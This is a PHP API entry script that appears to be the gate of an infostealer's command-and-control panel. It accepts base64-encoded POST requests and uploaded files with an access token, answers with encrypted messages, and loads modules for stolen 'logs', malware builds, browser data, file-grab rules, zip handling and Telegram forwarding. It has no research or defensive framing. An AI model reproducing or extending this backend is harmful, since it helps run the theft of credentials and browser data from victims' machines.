<?php

// -------------------------------------------------------------------------------------------
// debug mode?
define('DEBUG_MODE', false);

if(DEBUG_MODE)
{
    ini_set('display_errors', '1');
    ini_set('display_startup_errors', '1');
    error_reporting(E_ERROR);
}
else
{
    error_reporting(0);
}

ini_set('memory_limit', '4G');
ini_set('post_max_size', '1G');
ini_set('upload_max_filesize', '1G');
ini_set('max_execution_time', '180');

// -------------------------------------------------------------------------------------------
// includes
include_once 'config.php';

include_once 'app/geoip/geoip.inc';

include_once 'app/models/Log.php';
include_once 'app/models/Build.php';
include_once 'app/models/Browser.php';
include_once 'app/models/Plugin.php';
include_once 'app/models/FileRule.php';

include_once 'app/managers/LogsManager.php';
include_once 'app/managers/BuildsManager.php';
include_once 'app/managers/ZipManager.php';
include_once 'app/managers/BrowsersManager.php';
include_once 'app/managers/ProgramsManager.php';
include_once 'app/managers/MarkersManager.php';
include_once 'app/managers/TelegramManager.php';

include_once 'app/managers/APIManager.php';

// -------------------------------------------------------------------------------------------
// read request input
$input = base64_decode(file_get_contents('php://input'));
$request = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{
    $accessToken = isset($_POST['access_token']) ? $_POST['access_token'] : null;
    $type = isset($_POST['type']) ? $_POST['type'] : null;
    $type = isset($_POST['type']) ? $_POST['type'] : null;

    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK)
    {
        $base64Content = file_get_contents($_FILES['file']['tmp_name']);
        $base64Name = $_FILES['file']['name'];

        $request["type"] = $type;
        $request["access_token"] = $accessToken;
        $request["filename"] = $base64Name;
        $request["data"] = $base64Content;
    }
    else
    {
        $request = json_decode($input, true);
    }
}

// -------------------------------------------------------------------------------------------
// check json is valid
if (json_last_error() !== JSON_ERROR_NONE)
{
    // ---------------------------------------------------------------------------------------
    // generate response
    $response = 
    [
        "opcode" => "error",
        "code" => "1000"
    ];

    // ---------------------------------------------------------------------------------------
    // send response
    die(APIManager::EncryptMessage($response));
}

// -------------------------------------------------------------------------------------------
// start works
new APIManager($request);

?>